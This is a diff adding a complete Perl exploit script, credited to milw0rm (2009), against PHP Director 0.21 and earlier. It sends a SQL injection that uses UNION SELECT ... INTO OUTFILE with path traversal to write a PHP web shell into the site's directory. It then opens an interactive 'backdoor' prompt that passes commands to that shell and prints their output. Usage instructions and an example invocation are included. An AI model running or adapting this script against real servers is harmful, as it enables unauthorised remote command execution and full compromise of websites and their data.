@@ -1,0 +1,80 @@
+--+++===================================================================+++--
+--+++====== PHP Director <= 0.21 Remote Command Execution Exploit ======+++--
+--+++===================================================================+++--
+
+#!/usr/bin/perl
+
+use strict;
+use warnings;
+use IO::Socket;
+
+sub clear
+{
+	my $out = $_ [0];
+	$out =~ s/.+?xx//;
+	$out =~ s/xx.+//;
+	return $out;
+}
+
+sub usage
+{
+	print   "\nPHP Director <= 0.21 Remote Command Execution Exploit".
+		"\n[+] Author: darkjoker".
+		"\n[+] Site  : http://darkjoker.net23.net".
+		"\n[+] Download: http://downloads.sourceforge.net/phpdirector/PHPDirector-Install-0.21-.zip?modtime=1181090906&big_mirror=0".
+		"\n[+] Usage   : perl ${0} <hostname> <cms path> <shell destination>".
+		"\n[+] Ex.     : perl ${0} localhost /PHPDirector /opt/lampp/htdocs/PHPDirector".
+		"\n[+] Notes   : <shell destination> must be the same directory where CMS is hosted".
+		"\n\n";
+	exit ();
+}
+
+sub send_shell
+{
+	my ($host, $path, $disc_path) = @_;
+	my $sock = new IO::Socket::INET (
+		PeerHost => $host,
+		PeerPort => 80,
+		Proto    => "tcp",
+	) or die "[-] Exploit failed.\n";
+	my $sql_code = "searching=x' UNION SELECT 1,'xx<? system (\$_GET [cmd]); ".
+		    "?>xx', 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 INTO ".
+		    "OUTFILE '${disc_path}/shell.php' FROM pp_files#";
+	my $post = "POST ${path}/index.php HTTP/1.1\r\n".
+		"Host: ${host}\r\n".
+		"Connection: Close\r\n".
+		"Content-Length: ". length ($sql_code) . "\r\n".
+		"Content-Type: application/x-www-form-urlencoded\r\n\r\n".
+		$sql_code;
+	print $sock $post;
+	close ($sock);
+}
+
+my ($host, $path, $disc_path) = @ARGV;
+usage unless ($disc_path);
+$disc_path = "../"x10 . $disc_path;
+send_shell ($host, $path, $disc_path);
+print "Delete this shell after use.\n'quit' command to exit\n\n";
+my $cmd;
+while (1)
+{
+	print "backdoor\@${host}: \$ ";
+	$cmd = <STDIN>;
+	chomp $cmd;
+	$cmd =~ s/ /%20/g;
+	exit if ($cmd =~ /quit/);
+	my $sock = new IO::Socket::INET (
+		PeerHost => $host,
+		PeerPort => 80,
+		Proto    => "tcp",
+	);
+	my $get = "GET ${path}/shell.php?cmd=${cmd}\r\n\r\n";
+	print $sock $get;
+	my $x;
+	$x .= $_ while (<$sock>);
+	$x = clear ($x);
+	print $x;
+	close ($sock);
+}
+
+# milw0rm.com [2009-02-09]
